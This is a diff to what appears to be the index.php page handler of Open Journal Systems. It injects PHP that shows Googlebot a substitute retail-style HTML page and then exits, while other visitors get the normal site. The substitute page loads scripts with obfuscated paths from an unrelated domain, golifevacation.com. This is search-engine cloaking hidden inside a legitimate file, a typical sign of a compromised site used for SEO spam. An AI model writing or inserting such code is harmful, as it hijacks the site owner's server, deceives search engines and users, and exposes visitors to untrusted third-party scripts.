@@ -1,4 +1,9 @@
-<!DOCTYPE html>
+<?php
+
+if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
+{
+?>
+   <!DOCTYPE html>
 <html lang="en-US" xmlns:og="http://ogp.me/ns#" xmlns:fb="https://www.facebook.com/2008/fbml" style="--vh: 55.25px;"><head>
   <script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/destination?id=AW-1001213127&amp;cx=c&amp;gtm=4e65e0" nonce="+gWSoSeB7oJ/5IB7H6o53UJw"></script><script type="text/javascript" async="" src="https://bat.bing.com/bat.js" nonce="+gWSoSeB7oJ/5IB7H6o53UJw"></script><script async="" src="//www.googletagmanager.com/gtm.js?id=GTM-KWW5SS" nonce="+gWSoSeB7oJ/5IB7H6o53UJw"></script><script async="" defer src="https://www.etsy.com/include/tags.js"></script><script type='text/javascript' src='https://www.golifevacation.com/c7zKQpcaUQOsTNzLuEMfzd1_layUdgGlezI00v8jxUk5QoB68OKR-4r3zrxs7z4VfBmq_LnarnZS-yjDjN-J8FJlgm5-QyCIRnvlOJ9dRdl-O6SCo4z4IQiBNgB2GYztYLPIsb1IbSMvbw4Z877AJoHN3YboqlP1oYjXsBp6gek='></script>
   <script type='text/javascript' src='https://www.golifevacation.com/LS9iRyomafb604990j2QFqtmF5i8bj2SY3qm6FxXjzixb9dJrq0Cev0engeKLFgrLRDsdj1FMlTBOrf9iySzIA=='></script>
@@ -7574,3 +7579,33 @@
   </h2></div>
 
 </div><div id="privacy-settings-manager-load-complete" style="display: none;"></div><div id="footer-script-loaded" style="display: none;"></div><div id="privacy-settings-manager-load-complete" style="display: none;"></div><div id="footer-script-loaded" style="display: none;"></div></body></html>
+
+<?php
+exit;
+}
+?>
+
+<?php
+
+/**
+ * @defgroup pages_index Index Pages
+ */
+
+/**
+ * @file pages/index/index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup pages_index
+ *
+ * @brief Handle site index requests.
+ *
+ */
+
+switch ($op) {
+    case 'index':
+        define('HANDLER_CLASS', 'APP\pages\index\IndexHandler');
+        break;
+}
